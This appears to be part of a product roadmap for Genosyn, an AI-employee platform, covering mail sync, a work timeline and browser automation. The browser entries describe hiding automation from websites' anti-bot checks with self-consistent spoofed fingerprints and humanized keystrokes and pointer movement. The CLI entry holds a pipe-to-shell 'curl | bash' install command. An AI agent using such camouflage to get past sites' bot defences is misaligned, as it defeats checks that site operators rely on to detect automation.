SMTP submission has no server to synthesise them and the copy appended to Sent
has to carry the same `Message-ID` as what went out or one conversation becomes
two. It strips exactly one header on the way to the wire: Gmail drops `Bcc` on
ingest and an SMTP relay does not, so a blind copy that reached the recipients
as a header would not have been blind.

Deliberately **not** in M60, each with a reason. **Microsoft OAuth for
mail** — Microsoft has retired basic auth for IMAP on Outlook.com and
Exchange Online, so an Outlook mailbox needs an app password its tenant
allows; the honest fix is IMAP over XOAUTH2 on the existing `microsoft` OAuth
app, which is a provider module and a token-rotation path rather than a
guess, and it is the next thing here. **IMAP keywords as additive labels** —
supported by many servers and not all, and shipping a label that sometimes
moves a conversation and sometimes does not is worse than one that always
does. **One-click unsubscribe on an IMAP mailbox** — the RFC 8058 gate binds
the *receiving* server's DKIM verdict, and Genosyn knows which server that is
only for Gmail; trusting a `dkim=pass` line the sender may have written about
themselves is not a feature. A per-mailbox trusted `authserv-id` would fix it
and is a knob nobody would set correctly today. **Renaming the `gmail*`
columns** to `provider*` — five tables and ~50 call sites to change nothing a
user can see, on a codebase that already keeps the Repository section on
`code_repositories` for the same reason. And **disambiguating a duplicate
`Message-ID`**: the mirror keys IMAP messages on the sender-written
`Message-ID`, so two messages carrying the same one collapse into a single row
and the later import wins. Every mail client that threads on `Message-ID` has
that property, nothing upstream is touched, and keying on `(folder, UID)`
instead would lose a message the first time anybody archived it — but a sender
who reuses an id another message in the mailbox already had can quietly replace
the mirrored copy of it. Comparing the stored row's envelope before overwriting
would tell a genuine duplicate from a message that merely moved, and belongs in
the ingest path rather than bolted onto the end of this milestone.

Shared multi-tenant installs get the IMAP connector last: it opens a raw TCP
socket to a host the tenant names, which is the same egress question Postgres
and MySQL are already held back on, so it sits in
`SHARED_SAAS_BLOCKED_PROVIDERS` until raw-TCP integrations run in a dedicated
egress worker. Self-hosted installs — the ones this milestone is for — are
unaffected.

### M61 — The work timeline ✅

Home could tell you what was *waiting* on you and nothing about what your
workforce had actually done. The three nearest answers were each a different
question: Settings → Audit log, which is admin-gated, behind the `auditLog`
entitlement, and an investigation tool spanning every actor and all of history;
an employee's Journal, which is the employee narrating itself; and Home's
failed-routines alert, which by design shows only the Runs that broke. A
company whose roster ran cleanly all night had no way to see the night.

**Design calls recorded up front.** (1) No entity and no migration — the work is
already on disk, and a stored timeline is a second copy that drifts from the
rows it summarizes and that an employee could one day be given a tool to write.
It is assembled at read time, which is what makes it unable to flatter anyone.
(2) `audit_events` is the spine, riding the
`["companyId","actorEmployeeId","createdAt"]` index M58 added for exactly this
question; six tables are unioned onto it, each because audit provably misses
it — `runs` above all, since a scheduled tick writes no audit row at all and
`status` / `outcomeVerdict` / `checksVerdict` live nowhere else. Rows carrying a
`runId` or `conversationId` collapse into that parent as its **Effects** rather
than repeating as loose lines. (3) It reads `audit_events` on its own path, not
through `GET /audit`: browsing the company's whole history is the paid feature,
and seeing what your own workforce did today is not — the precedent is a Run's
own Effects, deliberately exempt since M58. The window is what keeps that
honest: one employee, bounded hours, no metadata blob, no action filter, no
paging into history. (4) It renders *below* the all-clear rather than inside it.
Every other panel on Home is a queue and hides when empty; this one is a record,
and a full night's work hidden behind "Nothing needs you right now" would make
that sentence a lie. It still hides itself when its own window is empty — except
when a Member has picked an employee, where a vanishing panel would read as a
fault rather than as quiet.

- [x] **The work timeline.** `services/employeeWorkTimeline.ts` unions
      `audit_events` with `runs`, assistant `conversation_messages`,
      `approvals`, fired `employee_wakeups`, `run_lessons` and
      `repository_work_session_turns` over a 24-hour window; no entity, no
      migration, `GET /work-timeline` with a zod-validated window
- [x] **Effects nest under their parent.** A ledger row carrying a `runId` or
      `conversationId` attaches to that Run or conversation, capped for render
      with an honest total; a row whose parent fell outside the window surfaces
      on its own rather than going missing
- [x] **Employee selector on Home.** A full-width panel below the queues —
      sticky Today/Yesterday headers, a rail-and-dot row per entry, the Run
      status, outcome and checks chips reused from the Routines views, a
      searchable employee picker, and the run viewer opening in place
- [x] **Member-safe by construction.** Vault-capture approvals hidden below
      admin, approval copy through `redactApprovalSummary`, every
      model-written label through `redactSensitiveText`, `vault.*` rows
      admin-only, todo labels filtered against `listAccessibleProjectIds`, and
      another Member's conversation reported without its subject — the same
      narrowings `getHomeData` already applies, not a new boundary
- [x] **`workstream.update` now writes a trail.** An employee advancing or
      closing its own Workstream was the one thing it could do that left no
      record anywhere

Deliberately **not** in M61. Paging past the window — the panel is a glance at
today, and the investigation tool for anything older already exists at
Settings → Audit log. A per-employee timeline *page*, which would be a second
place to maintain the same renderer before anyone has asked for one. And
`journal_entries`, which stay out on purpose: the employee's own account of its
work sitting next to the server's, in one list and one visual language, is
precisely the confusion this milestone exists to end.

## V1 backlog (post-MVP)

Items here are not on the active milestone path but worth picking up. Most
of the original V1 backlog has shipped — what remains is mostly
"engineering depth."

### Employee depth

- [x] **Memory / Journal** — `EmployeeMemory` durable facts auto-injected
      into prompts; `JournalEntry` is the per-employee diary feed
- [x] **Persisted Conversations** (M7)
- [x] **Handoffs** (`Handoff` entity + UI)
- [x] **Run history + artifacts** — every Run captures stdout/stderr;
      live-tail in modal
- [x] **Approvals / human-in-the-loop** (`Approval` entity, generalized
      via `kind` discriminator)
- [ ] **Reviews** — weekly/monthly self-review markdown an employee
      writes about its own performance
- [ ] **Goals / KPIs** — numeric goals updated in runs, surfaced on
      employee detail — superseded by **M51 Goals & Charter**, which is this
      item grown into the product's intent spine

### Task manager

- [x] **Projects + Todos** with statuses, assignees, due dates,
      `in_review` flow, comments
- [x] **Subtasks** — `Todo.parentTodoId`, one level deep; checklist +
      progress in the peek panel, parent/progress chips in list & board,
      `create_todo` / `update_todo` MCP params for AI breakdown
- [x] **Default assignee = creator** — a todo created without naming an
      assignee belongs to whoever created it (explicit null still means
      unassigned; MCP `create_todo` already defaulted to the calling
      employee)
- [x] **Auto-start on assign** — assigning a todo to an AI employee (on
      create or reassign, from the app) kicks off a background work session
      immediately: the todo flips to `in_progress`, the employee works it
      with its full toolset and posts its report as a thread comment, then
      moves the todo to `done` — or `in_review` when a reviewer is set.
      Skipped quietly when the employee has no AI Model connected
      (`services/todoKickoff.ts`)
- [x] **Project access** — `Project.accessMode` (`open` / `restricted`) plus
      `ProjectMember` rows authorizing human Members _and_ AI Employees at
      `read` / `write`. Todos and comments inherit the project's access;
      both the list and board views are gated by it. Projects are `open` by
      default, so nothing changes until someone restricts one
- [ ] **Share a project with a Team** — blocked on humans being able to
      belong to a `Team` at all (today `Team` groups AI employees only)

### Integrations

- [x] **MCP server support** (external + built-in `genosyn` stdio binary
      with short-lived per-spawn Bearer)
- [x] **Integrations + Connections framework** with grants
- [x] **Product-scoped Integrations pages** — every product exposes
      `/c/<company>/<product>/integrations` from its sidebar. Each page shows
      only the Connections and catalog entries relevant to that product
      (Explore: Postgres / MySQL / ClickHouse; Email: Google; Code: GitHub;
      etc.), while Settings → Integrations remains the complete company
      catalog. AI Employees, Skills, Routines, and Pipelines intentionally
      show every Integration because their runtimes can use any granted
      Connection.
- [x] **Stripe, Brex, GitHub, Linear, Notion, Postgres, MySQL, Clickhouse,
      Airtable, Telegram, Slack, Microsoft Teams, WhatsApp, X.com, Google
      (Calendar + Drive + Gmail scopes), Google Analytics (GA4, read-only),
      Google Search Console (read-only), Reddit, LinkedIn**, and the ads
      platforms (Google, Meta, Microsoft, Reddit)
- [~] **Retired in 1.132.0:** Metabase, NocoDB, Redis, Nostr, Lightning
      (NWC + LND), Hacker News, People Data Labs — and X's browser-login
      auth mode. The Vault (M37) made them redundant: a credential the
      company stores there, plus the App browser, reaches these services
      without a bespoke provider module to keep alive. Existing Connections
      are moved into the Vault on upgrade and then dropped; see
      `services/retiredIntegrationVaultBackfill.ts`. Retired ids are recorded
      permanently in `RETIRED_PROVIDERS` and must never be reused.
- [x] **Secrets vault** (`Secret` entity, env-merged into spawns)
- [x] **Incoming webhooks** for both routines and pipelines
- [x] **Email attachments from Resources** — `gmail_send_message` /
      `gmail_create_draft` take `attachments: [{resourceSlug, format}]`.
      The server resolves the slug, checks the `EmployeeResourceGrant`,
      and attaches the bytes; slugs only, so no base64 ever crosses the
      model. `format: "original"` attaches the uploaded file verbatim,
      the rest render `bodyText` through the export pipeline.

### Org depth

- [x] **Teams** + reporting lines (`reportsToEmployeeId` org chart)
- [x] **Templates / Hiring** — `EMPLOYEE_TEMPLATES` static catalog,
      consumed by `EmployeeNew.tsx` to seed Soul + Skills + Routines

### Platform

- [x] **API keys + REST API** — see M14 above
- [x] **Audit log** (`AuditEvent` with `actorKind: human | ai | webhook`)
- [x] **Usage & cost** — per-employee / per-routine token spend rollups
- [x] **Backups** — `Backup` + `BackupSchedule`, restore endpoint,
      catch-up backup on boot, plus off-box `BackupDestination` mirrors
      (mounted NAS path, SMB share, or SFTP) that auto-deliver every
      completed archive. Retention on the `BackupSchedule` row deletes local
      archives past a day count (hourly + after each backup), always sparing
      the newest completed archive and anything uploaded by hand
- [x] **Migrations dashboard** — read-only `Admin → Migrations` over the
      TypeORM ledger: applied / pending counts plus drift detection (rows
      matching no shipped migration, out-of-order timestamps from a branch
      merge). Boot still applies migrations automatically; this is the
      detail view behind the Instance Health migrations probe
- [x] **Notifications** — bell + panel, per-user feed
- [x] **Web Push (PWA)** — `web-push` + auto-generated VAPID keypair in
      `app_settings`, `PushSubscription` per device, fan-out on every
      bell row, `push`/`notificationclick` handlers in `sw.js`, opt-in
      from Home banner or Settings → Profile
- [x] **Command palette (⌘K)** — centred, searchable directory of every
      section, opened by `⌘K`/`Ctrl K` or the top-nav section pill. Ranked
      search over labels, descriptions, and a hidden synonym index (typing
      "cron" lands on Routines), full keyboard control. Replaced the mega-menu
      that used to drop out of the section pill
- [x] **Keyboard-first navigation** — `G` then a mnemonic key opens any
      top-level page, with a visible destination HUD after the first key and a
      complete `?` shortcut guide. Chords pause in editors and dialogs;
      consistent focus rings, Escape handling, and a skip-to-main link make
      the rest of the shell keyboard-friendly too
- [x] **Optimistic UI + background mutations** — high-frequency actions update
      locally on click while the API request continues in the background:
      email send/triage, todos and review queues, approvals, notifications,
      tags, grants, settings toggles, and list-row archive/delete/status
      actions. Nothing announces the work while it runs; a failure restores the
      affected row, value, draft, or composer and says why, inline where the
      action started or in the error modal.
- [x] **Palette entity search** — the ⌘K palette also searches the company's
      content by name (`GET /api/companies/:cid/search`): AI employees,
      skills, routines, channels, projects, todos, bases, notebooks, notes,
      resources, charts, dashboards, repos, pipelines, customers. Sections
      stay first; entity hits group by kind underneath and ↵ opens them
      (todos land on their project board). Respects project access modes
      and private-channel membership
- [x] **Home page** — post-sign-in landing at the company root:
      unread notifications, my todos, reviews waiting on me, pending
      approvals, unread channels/DMs, the latest personally unread TLDR,
      today's journal digest, section directory (Employees roster moved to
      `/employees`). The digest line is superseded by the M61 work
      timeline, which reports the server's record of the day rather than
      the employees' own
- [x] **Home answers in place** — every queue row on Home opens over the
      page instead of navigating away from it. An unread channel opens its
      messages with a "New" line at the server's own unread boundary
      (`ChannelMember.lastReadAt`, now on the channel DTO) and a reply box;
      a todo or review opens the project board's own detail panel with its
      resolve buttons; an approval opens what the employee asked for, the
      consequence of approving, and Approve / Reject; a health check opens
      the rows behind its number; a failed Run opens `RunLiveModal`; a
      notification opens its body — and embeds the Decision card when it is
      one — instead of marking itself read on a mis-click. TLDR questions
      answer under the briefing on Home rather than on `/tldrs`.
      Each peek carries a labelled button to the full page, and rows stay
      real anchors so ⌘-click still opens it. The detail surfaces are
      shared components, not second copies:
      `components/workspace/MessageList`, `components/todos/TodoDetail`,
      `components/health/HealthCheckDetail`,
      `components/approvals/approvalCopy`
- [x] **SSO / Google login** — instance-wide, Admin → SSO, disabled by
      default; see M16
- [x] **2FA (TOTP + passkeys / security keys)** — see M15
- [x] **Dark mode** — fully covered (1,500+ `dark:` classes)
- [x] **CLI** — `CLI/genosyn` bash wrapper around Docker, installed via
      `curl -fsSL https://genosyn.com/install.sh | bash`; fresh installs
      schedule a daily CLI + image upgrade by default, managed with
      `genosyn auto-update on|off|status`; upgrades retain the prior container
      until the new version is healthy, while opt-in `genosyn upgrade --backup`
      also takes and validates a consistent data-volume backup and restores it
      on failure
- [ ] **Scripting CLI** — second, product-facing CLI for programmatic
      operations on companies / employees / routines (depends on M14)
- [~] **Import/export** — backup/restore round-trips a whole install;
  per-company export (one tenant out of a multi-company install) is
  still pending

### Runner

- [x] **Real execution** via the in-process agent against the model API
      (Anthropic / OpenAI / custom OpenAI-compatible), plus the trusted
      single-tenant OpenAI subscription path through the official Codex
      app-server; see M22
- [x] **Streaming logs to UI** (SSE on `employeeSurface.ts`)
- [x] **cwd-scoped tools** — the coding tools are rooted at the employee's
      working directory; bash inherits company secrets + repo env
- [x] **Browser access for AI employees** — headless Chromium bundled in
      the App container (Alpine `chromium` driven by `playwright-core`),
      opt-in per employee via `AIEmployee.browserEnabled`. Reserved
      built-in `browser` MCP exposes `browser_open`, `browser_snapshot`,
      `browser_click`, `browser_fill`, `browser_press`,
      `browser_screenshot`, `browser_close`, plus `browser_submit` and
      `browser_resume` for human-gated form submits. Stamped into all
      five providers' configs.
  - [x] **URL allow list.** `AIEmployee.browserAllowedHosts` (newline-
        separated host globs like `*.gmail.com`, `notion.so`). Empty list
        = unrestricted. Enforced inside `browser_open` before navigation.
  - [x] **Per-routine override.** `Routine.browserEnabledOverride`
        (`true` / `false` / `null`). Null inherits the employee setting;
        explicit values override either way. Materializer takes a
        `routineId` option from the runner and applies the override
        before stamping `.mcp.json`.
  - [x] **Approval mode for form submits.**
        `AIEmployee.browserApprovalRequired` boolean. When on, the new
        `browser_submit` tool queues an `Approval` (kind=`browser_action`)
        and returns `{status:"pending_approval", approvalId}`. The model
        calls `browser_resume(approvalId)` to re-fire once a human
        approves; rejections come back as a tool error.
  - [x] **Efficient agent browsing (v2).** Snapshots moved to Playwright
        aria snapshots in `ai` mode — every interactive element carries a
        `[ref=eN]` marker the model acts on via `aria-ref=eN` selectors
        (works into iframes), replacing the removed
        `page.accessibility.snapshot()` API that had left the tree
        permanently empty. Added `browser_select`, `browser_hover`,
        `browser_scroll`, `browser_back`, and `browser_wait`; popups are
        auto-adopted (the triggering action waits for the swap before it
        snapshots), JS dialogs auto-handled and surfaced as snapshot
        notes, wrong selectors fail in 5s with a snapshot in the error,
        the post-action settle is DOM-quiescence based (~0.3s typical vs
        a flat 3s `networkidle` wait) with a hard Node-side cap, and
        screenshots are JPEG. Approval-gated submits resume across turns
        off the Approval row but are bound to the approved page and fire
        exactly once; browser sessions survive App restarts via a DB
        token fallback. Docs at `/docs/browser`.
  - [x] **Live view + take-over.** Every browser-enabled spawn mints a
        `BrowserSession` row; the MCP child opens a CDP screencast
        (`Page.startScreencast`, JPEG q60) and pushes frames over a
        WebSocket up to the App, which fans them out to viewers
        connected at `/api/companies/:cid/employees/:eid/browser-sessions/
:id/view`. The viewer page is a plain HTML+canvas iframe that
        also forwards mouse / keyboard events back via CDP
        `Input.dispatchMouseEvent` / `dispatchKeyEvent` when the human
        flips into "Take over" mode. Solves captcha / 2FA without an
        external service. The async `browser_submit` Approval flow
        stays as the fallback for unattended routines.
  - [x] **Browser recordings for Routine Runs.** A Run-linked
        `BrowserSession` starts silent visual capture only when that session
        actually uses a browser, for both Genosyn's browser and a Member
        browser. Capture is per session, so parallel delegated browser work
        produces separate MP4s instead of overwriting the parent Run's view.
        Files are finalized with the Run/session lifecycle. Startup recovery
        promotes any partial ffprobe can still read and discards only torn
        bytes, and cleanup follows the owning Run. The bytes stay App-private
        under `.private/browser-recordings/<company-id>/<run-id>/`. A recording
        is never withheld: it is kept whole and access is the boundary instead.
        Recordings from Genosyn's browser go to company admins **and to the
        Member the AI Employee reports to** (`services/reportingLine.ts` walks
        `reportsToEmployeeId` upward to the first `reportsToUserId` human), so
        supervising an employee does not require the admin role over everything
        else. Member-browser recordings stay exact-owner-only — that is
        someone's own computer, not company equipment — and still require an
        explicit unattended-recording consent. The password/Vault observers are
        retained, but they now only redact what the *AI Employee* sees
        (screenshots, page text, error strings); they no longer delete video.
        The Runs UI surfaces every available recording beside its Run log, with
        the same behavior documented at `/docs/browser` and `/docs/routines`.
  - [x] **Member browsers.** A Member connects a Chrome running on their
        own computer and a granted employee drives that instead of the
        container's Chromium. A zero-dependency Node bridge
        (`server/browser-bridge/agent.mjs`, served from the App and paired
        with a one-time code) launches a **dedicated** Chrome profile —
        Chrome 136+ refuses `--remote-debugging-port` on the default
        user-data-dir, and attaching to the human's everyday browser would
        expose their tabs, cookies, and dialogs — then dials out over one
        WebSocket relaying raw CDP. The App mints a loopback-only
        single-use `ws://` endpoint for `chromium.connectOverCDP()`, so all
        16 `browser_*` tools work unchanged. `MemberBrowser` +
        `EmployeeMemberBrowserGrant` rows; grant and policy re-checked on
        every RPC, so revocation stops an in-flight Run. The browser's own
        allow list is mandatory (empty = opens nothing, unlike the employee
        list) and re-enforced on the laptop alongside a CDP deny list;
        approvals default on and union with the employee setting;
        unattended Routine use is opt-in; only the owner may select, watch,
        or take over; one driver at a time; `browser_save_vault_login` is
        refused there. Offline / busy / mid-action failures tell the model
        to stop rather than silently fall back to the server browser.
        Forced off in shared SaaS by startup validation. Docs at
        `/docs/member-browsers`.
  - [~] **Browser-login Connections rejoin the same browser.** *Retired in
        1.132.0 — the whole `authMode: "browser"` mode is gone, superseded by
        a Vault login the built-in Browser fills at the exact saved origin
        (M37). `services/browserConnectionHealth.ts` and
        `ctx.sharedBrowserState` were deleted with it; the shared desktop-Chrome
        profile and the per-mode tool filtering below outlived it. Kept here
        because the reasoning still explains why the Vault path is shaped the
        way it is.* The
        `authMode: "browser"` Integration drivers (X today) ran a second,
        private Chromium that no human could see or take over, kept its own
        cookie jar, announced itself with a `Genosyn/0.1` user agent, and
        reported "Connected" whenever a password was merely stored. An
        employee therefore promised a "direct integration with no login
        page", drove the same walled-off login, and told the operator to
        finish a sign-in in a session that did not exist. Now:
        the desktop-Chrome disguise is shared (`services/browserProfile.ts`)
        so the driver stops advertising itself as a bot; the driver reads
        and writes the employee's shared storage state via a host-bound
        `ctx.sharedBrowserState`, so a human take-over sign-in in the live
        panel *is* the remedy and a driver-managed login saves the human one
        later; failures are classified, recorded on the Connection and
        backed off (`services/browserConnectionHealth.ts`) rather than
        re-driven every call; `checkStatus` reports the session actually
        observed, so the pill reads Error/Expired with the remedy printed
        under it; and each Connection advertises only the tools its auth
        mode can run, with the mode's caveat appended to every description
        (`services/integrationToolListing.ts`). Genosyn still never solves
        a challenge — it hands the page to a person and reuses the result.
  - [x] **Real Chrome in the container.** The disguise above was the wrong
        shape of fix and it did not hold: the image was Alpine, Google ships
        Chrome for glibc only, so the browser was Alpine's `chromium` claiming
        to be Chrome 134 on macOS. Sites do not detect automation so much as
        *contradictions*, and that profile contradicted itself everywhere the
        costume did not reach — `navigator.platform` still read Linux, the UA
        carried a full build number Chrome's UA reduction stopped sending,
        WebGL read SwiftShader, `ttf-freefont` was the entire font list, and
        every patched getter printed its own arrow-function source when asked
        for `toString()`. Two of the patches were worse than the tells they
        hid: `navigator.webdriver` was forced to `undefined` (real Chrome
        answers `false`; no browser answers `undefined`), and the notification
        patch produced `denied` + `prompt`, a pairing that occurs nowhere.
        Now the App image is Debian and ships **real Google Chrome** from
        Google's apt repo on both amd64 and arm64 (Google shipped official
        arm64 Linux builds in July 2026), running **headed** against an Xvfb
        display started by `docker-entrypoint.sh`, with real font packages.
        `browserProfile.ts` asks the binary what it is and, on real headed
        Chrome, overrides *nothing* — no UA, no client hints, no init script —
        because a true identity is self-consistent for free. The mask survives
        only as a compatibility path for a source-managed host with no Chrome,
        rewritten so no patch is detectable as a patch (native-looking
        `toString`, `webdriver === false`, real `PluginArray`/`MimeTypeArray`,
        `Notification.permission` and `permissions.query` patched as a pair).
        Locale and timezone are no longer hardcoded to Los Angeles — empty
        means "inherit", because a browser claiming LA from a European IP is
        the same kind of mismatch. `services/browserFingerprint.ts` states the
        invariants as code and `POST /api/admin/browser-self-test` runs them
        against the live profile, so a Chrome bump or a silent fallback to
        Chromium is caught by a diagnostic rather than by a 3am Routine
        failure. Blocked-connection remedies now name Member browsers, which
        is the honest answer when a site refuses server-hosted browsers as
        such. Genosyn still solves no captcha; this removes *false* signals
        from a browser doing legitimate work.
  - [x] **Drive it like a person, not a framework.** Real headed Chrome closed
        the *fingerprint* contradictions, but a login was still challenged where
        a human on the same browser and IP was not — because the input arrived
        the way automation drives a browser and not the way a person does.
        `fill()` set a field's value in one shot with zero keystrokes and
        `click()` teleported the pointer, so a sign-in form saw a username and
        password appear with none of the keystroke or pointer telemetry X and
        the anti-bot vendors score. `services/humanInput.ts` re-enters input the
        human way — type character by character with randomized gaps, approach a
        control with the pointer before clicking, hold a key press for a real
        dwell, pause briefly between actions — and the `browser_*` RPCs route
        every fill/click/press/hover through it, so it covers the container's own
        Chrome and Member browsers alike. It changes only *how* a value arrives,
        never *what*: a Vault credential is typed into the same field, never
        returned, still password-taint redacted, and the time-boxed one-time-code
        paths are exempt from the think-pause so a fresh code never lapses.
        Playwright's actionability waits are preserved and it degrades to the
        old fill/click when disabled. On by default; `config.browser.humanize`
        turns it off. Still camouflage, never challenge-solving — a real
        challenge still stops for a human.
  - [x] **Browser sessions survive a container update.** `releasePage` was the
        only thing that wrote an employee's cookies to disk, and its
        `"shutdown"` reason had no caller — the App had no `SIGTERM` handler at
        all. So every `docker stop` and every `genosyn update` killed live
        browsers mid-flight and rolled that employee back to the previous
        snapshot; a sign-in performed inside the five-minute idle window was
        simply lost. Signals now flush every session through `releaseAllPages`
        within a 6s budget (well inside Docker's 10s before `SIGKILL`), and a
        debounced save behind page navigation bounds what an ungraceful kill
        can cost to the last page load. IndexedDB and service-worker storage
        remain out of scope, as does Chrome's own profile directory.
- [x] **Genosyn-level sandbox** — Bubblewrap user/mount/PID/IPC/UTS namespaces,
      a best-effort cgroup namespace, a single writable employee workspace,
      explicit environment, optional network namespace, and realpath/symlink
      containment. Shared SaaS requires this mode with networking disabled.
- [x] **Per-run context window budget** — the loop budgets each turn against
      `AIModel.contextWindow` (85% of it, leaving room to reply), and drops the
      oldest tool results to a stub when the next prompt wouldn't fit. Results
      are shrunk in place, never removed, because both wire formats require a
      `tool_use` to keep its `tool_result`. A provider that rejects a prompt
      anyway is caught, compacted hard, and retried once, so an unknown window
      degrades instead of killing the run. Per-result caps scale to the window;
      the transcript shows `[compact]` whenever history was dropped. Operators
      can set the window by hand (`contextWindowSource: "manual"`) for the many
      servers that report none. A three-hourly sweep re-asks every probeable,
      connected model so a relaunched server's new limit lands on its own
      (`services/agent/contextWindowRefresh.ts`); a failed probe keeps the last
      known number and a hand-set window is never overwritten

---

## V2+ wild ideas

- **Marketplace** of Soul personas + skill packs (M17 above is the seed)
- **Voice** — TTS summaries; "call" an employee
- **More meeting platforms** — Google Meet presence shipped in M44; bring the
  same disclosed-guest, host-admitted recording path to Zoom, Teams and Webex
  without pretending one platform's browser flow generalises to the others
- **Soul versioning + contracts** — Soul edits go through approval
- **Performance dashboards** — heatmaps of routine reliability
- **Federation** — two self-hosted Genosyn orgs cooperate on a shared
  project

---

## Design principles

1. **Employee-first, not workflow-first.** The primary noun is the
   employee; routines, skills, and grants hang off them.
2. **Database as source of truth.** Soul, skills, routines, run logs, model
   credentials, Connection credentials, and MCP configuration live on DB rows.
   The filesystem only carries working trees, browser state, uploads, and tool
   artifacts.
3. **Local-first & self-hostable.** SQLite works offline on a laptop; flip
   `config.db.driver` to Postgres when you outgrow it.
4. **Human-in-the-loop by default.** Autonomy is opt-in per routine, and
   per-Connection thresholds (e.g. `requireApprovalAboveSats` on
   Lightning) gate risky actions.
5. **Boring tech, clean UI.** Express + TypeORM + React. No frameworks of
   the month. Linear × Notion feel.
